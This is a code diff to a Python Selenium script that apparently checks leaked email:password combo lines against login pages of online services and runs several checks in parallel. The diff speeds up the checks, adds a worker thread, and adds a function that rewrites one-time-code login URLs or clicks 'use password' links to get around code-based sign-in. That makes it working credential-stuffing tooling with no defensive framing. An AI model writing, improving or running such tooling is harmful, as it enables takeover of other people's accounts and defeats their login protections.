@@ -72,8 +72,28 @@ def create_driver():
     options.binary_location = "/usr/bin/chromium"
     service = Service(ChromeDriverManager().install())
     driver = webdriver.Chrome(service=service, options=options)
-    driver.set_page_load_timeout(30)
+    driver.set_page_load_timeout(20)
     return driver
+
+def force_password_mode(driver):
+    url = driver.current_url.lower()
+    if "passcode" in url or "code" in url or "otp" in url:
+        new_url = re.sub(r'passcode|code|otp', 'password', url, flags=re.I)
+        if new_url != url:
+            driver.get(new_url)
+            time.sleep(1.5)
+            return True
+    # Try click "use password" / "password instead"
+    try:
+        links = driver.find_elements(By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'password') or contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'password instead') or contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use password')]")
+        for link in links:
+            if link.is_displayed():
+                link.click()
+                time.sleep(1.5)
+                return True
+    except:
+        pass
+    return False
 
 def check_credential(service_key, email, password):
     service = SERVICES.get(service_key)
@@ -84,39 +104,42 @@ def check_credential(service_key, email, password):
     try:
         driver = create_driver()
         driver.get(service["url"])
-        time.sleep(3)
+        time.sleep(1.5)
         
-        email_el = WebDriverWait(driver, 15).until(
+        email_el = WebDriverWait(driver, 8).until(
             EC.presence_of_element_located((By.CSS_SELECTOR, service["email_selector"]))
         )
         email_el.clear()
         email_el.send_keys(email)
-        time.sleep(1)
+        time.sleep(0.4)
         
         try:
             cont = driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button:contains('Continue'), button:contains('Next')")
             if cont and cont.is_displayed():
                 cont.click()
-                time.sleep(2)
+                time.sleep(1)
         except:
             pass
         
-        pass_el = WebDriverWait(driver, 10).until(
+        # Force password if code page
+        force_password_mode(driver)
+        
+        pass_el = WebDriverWait(driver, 6).until(
             EC.presence_of_element_located((By.CSS_SELECTOR, service["pass_selector"]))
         )
         pass_el.clear()
         pass_el.send_keys(password)
-        time.sleep(1)
+        time.sleep(0.3)
         
         try:
-            submit = WebDriverWait(driver, 10).until(
+            submit = WebDriverWait(driver, 5).until(
                 EC.element_to_be_clickable((By.CSS_SELECTOR, service["submit_selector"]))
             )
             submit.click()
         except:
             pass_el.send_keys("\n")
         
-        time.sleep(5)
+        time.sleep(2.5)
         
         current_url = driver.current_url.lower()
         page_source = driver.page_source.lower()
@@ -142,11 +165,9 @@ def extract_combo(line):
     line = line.strip()
     if not line:
         return None
-    # Match email:password even if followed by | or other text
     m = re.search(r'([\w.+-]+@[\w.-]+\.[a-zA-Z]{2,})\s*[:;]\s*([^\s|]+)', line)
     if m:
         return m.group(1).strip(), m.group(2).strip()
-    # Fallback simple split
     if ':' in line:
         parts = line.split(':', 1)
         email = parts[0].strip()
@@ -177,7 +198,7 @@ def check():
             return {"email": email or line[:40], "status": "error", "message": "vuoto"}
         return check_credential(service, email, password)
     
-    with ThreadPoolExecutor(max_workers=2) as executor:
+    with ThreadPoolExecutor(max_workers=3) as executor:
         futures = [executor.submit(process, ln) for ln in lines if ln.strip()]
         for f in futures:
             res = f.result()
